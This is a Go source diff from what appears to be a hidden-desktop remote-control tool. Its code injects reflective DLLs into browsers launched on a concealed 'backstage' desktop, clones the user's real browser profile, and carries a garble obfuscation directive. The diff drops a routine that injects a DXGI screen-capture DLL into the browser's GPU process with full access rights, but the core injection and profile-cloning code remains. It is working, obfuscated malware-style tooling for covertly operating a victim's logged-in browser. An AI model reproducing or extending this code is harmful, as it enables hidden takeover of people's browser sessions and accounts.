@@ -55,6 +55,8 @@ const (
 	PROCESS_VM_READ           = 0x0010
 	PROCESS_ALL_ACCESS_INJ    = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
 
+	SYNCHRONIZE = 0x00100000
+
 	MEM_COMMIT             = 0x1000
 	MEM_RESERVE            = 0x2000
 	PAGE_EXECUTE_READWRITE = 0x40
@@ -164,7 +166,7 @@ func enableDebugPrivilege() {
 // StartbackstageProcessInjected starts a process suspended on the backstage desktop,
 // injects the reflective DLL, then resumes it.
 // searchPath/replacePath are passed as environment variables for the DLL hooks.
-func StartbackstageProcessInjected(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string, display int) (uint32, error) {
+func StartbackstageProcessInjected(filePath string, dllBytes []byte, searchPath, replacePath string, display int) (uint32, error) {
 	if filePath == "" {
 		return 0, fmt.Errorf("empty file path")
 	}
@@ -173,13 +175,12 @@ func StartbackstageProcessInjected(filePath string, dllBytes []byte, captureDllB
 	}
 
 	result, err := executebackstageTask(backstageTask{
-		kind:            backstageTaskStartProcessInjected,
-		filePath:        filePath,
-		dllBytes:        dllBytes,
-		captureDllBytes: captureDllBytes,
-		searchPath:      searchPath,
-		replacePath:     replacePath,
-		display:         display,
+		kind:        backstageTaskStartProcessInjected,
+		filePath:    filePath,
+		dllBytes:    dllBytes,
+		searchPath:  searchPath,
+		replacePath: replacePath,
+		display:     display,
 	}, 30*time.Second)
 	if err != nil {
 		return 0, err
@@ -187,7 +188,7 @@ func StartbackstageProcessInjected(filePath string, dllBytes []byte, captureDllB
 	return result.pid, result.err
 }
 
-func StartbackstageBrowserInjected(browser string, exePath string, dllBytes []byte, captureDllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, display int, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc, onLaunchStatus LaunchStatusFunc) error {
+func StartbackstageBrowserInjected(browser string, exePath string, dllBytes []byte, clone bool, cloneLite bool, killIfRunning bool, display int, onProgress CloneProgressFunc, onDXGIStatus DXGIStatusFunc, onLaunchStatus LaunchStatusFunc) error {
 	if onDXGIStatus != nil {
 		backstageDXGIStatusCallback.Store(onDXGIStatus)
 	}
@@ -234,7 +235,7 @@ func StartbackstageBrowserInjected(browser string, exePath string, dllBytes []by
 
 	if !clone {
 		notify("launch", true, "starting without profile cloning")
-		pid, err := StartbackstageProcessInjected(exePath, dllBytes, captureDllBytes, "", "", display)
+		pid, err := StartbackstageProcessInjected(exePath, dllBytes, "", "", display)
 		if err != nil {
 			notify("launch", false, fmt.Sprintf("CreateProcess failed: %v", err))
 			return err
@@ -295,7 +296,7 @@ func StartbackstageBrowserInjected(browser string, exePath string, dllBytes []by
 	}
 
 	notify("launch", true, "starting with cloned profile")
-	pid, err := StartbackstageProcessInjected(exePath, dllBytes, captureDllBytes, realUserData, cloneDir, display)
+	pid, err := StartbackstageProcessInjected(exePath, dllBytes, realUserData, cloneDir, display)
 	if err != nil {
 		notify("launch", false, fmt.Sprintf("CreateProcess failed: %v", err))
 		return err
@@ -318,8 +319,8 @@ func StartbackstageBrowserInjected(browser string, exePath string, dllBytes []by
 }
 
 // StartbackstageChromeInjected is kept for backward compatibility.
-func StartbackstageChromeInjected(chromePath string, dllBytes []byte, captureDllBytes []byte) error {
-	return StartbackstageBrowserInjected("chrome", chromePath, dllBytes, captureDllBytes, true, false, true, 0, nil, nil, nil)
+func StartbackstageChromeInjected(chromePath string, dllBytes []byte) error {
+	return StartbackstageBrowserInjected("chrome", chromePath, dllBytes, true, false, true, 0, nil, nil, nil)
 }
 
 type browserInfo struct {
@@ -1001,7 +1002,7 @@ func calcDirSize(dir string) int64 {
 	return total
 }
 
-func startbackstageProcessInjectedOnThread(filePath string, dllBytes []byte, captureDllBytes []byte, searchPath, replacePath string, display int) (uint32, error) {
+func startbackstageProcessInjectedOnThread(filePath string, dllBytes []byte, searchPath, replacePath string, display int) (uint32, error) {
 	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
 	if filePath == "" {
 		return 0, fmt.Errorf("empty file path")
@@ -1055,62 +1056,7 @@ func startbackstageProcessInjectedOnThread(filePath string, dllBytes []byte, cap
 
 	log.Printf("backstage inject: process PID %d resumed with DLL hooks active", pid)
 
-	if len(captureDllBytes) > 0 {
-		if !backstageDXGIEnabled.Load() {
-			log.Printf("backstage inject: DXGI is disabled, skipping capture DLL injection for GPU child process")
-		} else {
-			go func() {
-				defer recoverAndLog("backstage deferred gpu inject", nil)
-				backstageDeferredGPUInject(pid, captureDllBytes)
-			}()
-		}
-	}
-
 	return pid, nil
-}
-
-func backstageDeferredGPUInject(browserPID uint32, captureDllBytes []byte) {
-	time.Sleep(4 * time.Second)
-
-	for attempt := 0; attempt < 15; attempt++ {
-		gpuPID, err := findGPUChildProcess(browserPID)
-		if err != nil {
-			log.Printf("backstage inject: GPU child not found for PID %d (attempt %d): %v", browserPID, attempt, err)
-			time.Sleep(2 * time.Second)
-			continue
-		}
-
-		log.Printf("backstage inject: found GPU child process PID %d for browser PID %d", gpuPID, browserPID)
-
-		hProcess, _, _ := procOpenProcess.Call(PROCESS_ALL_ACCESS_INJ, 0, uintptr(gpuPID))
-		if hProcess == 0 {
-			log.Printf("backstage inject: failed to open GPU process PID %d", gpuPID)
-			return
-		}
-
-		if err := reflectiveInject(hProcess, captureDllBytes); err != nil {
-			log.Printf("backstage inject: BackstageCapture DLL injection into GPU PID %d failed: %v", gpuPID, err)
-			procCloseHandle.Call(hProcess)
-			if fn, ok := backstageDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
-				fn(false, gpuPID, fmt.Sprintf("DXGI injection failed for GPU PID %d", gpuPID))
-			}
-			return
-		}
-		procCloseHandle.Call(hProcess)
-
-		log.Printf("backstage inject: BackstageCapture DLL injected into GPU PID %d", gpuPID)
-		backstageRegisterInjectedPID(gpuPID)
-		backstageRegisterGPUPID(browserPID, gpuPID)
-		if fn, ok := backstageDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
-			fn(true, gpuPID, fmt.Sprintf("DXGI capture active (GPU PID %d)", gpuPID))
-		}
-		return
-	}
-
-	log.Printf("backstage inject: gave up finding GPU child for browser PID %d", browserPID)
-	if fn, ok := backstageDXGIStatusCallback.Load().(DXGIStatusFunc); ok && fn != nil {
-		fn(false, 0, "DXGI injection failed: GPU process not found")
-	}
 }
 
 func findGPUChildProcess(parentPID uint32) (uint32, error) {
